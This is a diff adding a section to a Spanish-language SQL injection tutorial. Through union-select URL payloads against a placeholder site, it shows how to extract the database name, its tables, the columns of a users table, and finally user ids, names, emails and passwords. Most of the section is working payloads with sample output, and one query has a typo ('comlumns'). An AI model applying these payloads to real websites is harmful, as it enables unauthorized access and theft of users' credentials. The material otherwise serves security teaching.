@@ -11,6 +11,7 @@
       * [Usando union select](#Usando-union-select)
       * [Sacando información](#Sacando-información)
          * [mysql sql Injection Cheat Sheet](#mysql-sql-Injection-Cheat-Sheet)
+      * [Sacando informacion personalizada](#Sacando-informacion-personalizada)
     * [Inyección sql automatizada con sqlmap](#Inyección-sql-automatizada-con-sqlmap)
 
 
@@ -185,6 +186,81 @@ Basicamente es una lista con muchos "trucos" se puede decir, como es la traducci
 | DB location | SELECT @@datadir | nos muestra la direccion en donde esta instalada la base de datos | 
  
 ```
+
+### Sacando informacion personalizada
+
+Ahora vamos a analizar mas a detalle como sacar informacion de la base de datos, regresando al ejemplo con el que estamos practicando, vamos a usar `database()`, que como ya lo vimos nos sirve para que nos muestre el nombre de la base de datos con la que estamos trabajando;
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
+```
+Nos muestra:
+
+`nombre_DB`
+
+ahora tenemos el nombre de la base de datos.
+
+lo siguiente que vamos a hacer es sacar las tablas de la base de datos, aquí hay 2 maneras:
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.tables --+
+```
+Nos muestra:
+
+`las principales tablas de la base de datos information_schema`
+
+para sacar las tablas de la base de datos que sacamos antes: `nombre_DB` hacemos lo siguiente:
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.tables where table_schema=database() --+
+```
+
+Nos muestra las principales tablas de la base de datos `nombre_DB`:
+
+supongamos que encontramos las tablas:
+
+`usuarios, otra_tabla, hola_soy_otra_tabla`
+
+logicamente la que nos interesa es la tabla `usuarios`
+
+Ahora vamos a entrar a la tabla `usuarios` dentro de la base de datos `nombre_DB` para sacar las columnas:
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from information_schema.comlumns where table_name="usuarios" --+
+```
+
+Nos muestra:
+
+`id, name, email, passwd`
+
+que son generalmente las que se pueden encontrar.
+
+Ahora, para mostrar el contenido de esas columnas: `id, name, email, passwd` solo tenemos que recordar en que tabla estan para asi poder llamarlas, así;
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(id,name,email,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from usuarios --+
+```
+Nos muestra:
+
+`0pepitopepito@correo.comcontraseñasegura`
+
+si se dan cuenta esta todo junto por que asi es como lo estamos llamando, para arreglar esto vamos a hacer uso de la codificacion `hex` y del simbolo `:`.
+
+el simbolo `:` en `hex` nos queda así: `0x3a`.
+
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(id,0x3a,name,0x3a,email,0x3a,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from usuarios --+
+```
+Nos muestra:
+
+`0:pepito:pepito@correo.com:contraseñasegura`
+
+ahora más entendible.
+
+
+
+
+
 
 
 
